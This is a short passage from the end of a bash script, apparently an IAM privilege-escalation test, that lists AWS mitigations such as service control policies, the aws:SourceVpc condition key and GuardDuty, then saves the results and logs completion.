result_text+="3. SCP (Service Control Policies)"$'\n'
result_text+="4. aws:SourceVpc Condition Key"$'\n'
result_text+="5. Amazon GuardDuty"$'\n'

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "IAM privilege escalation test complete"
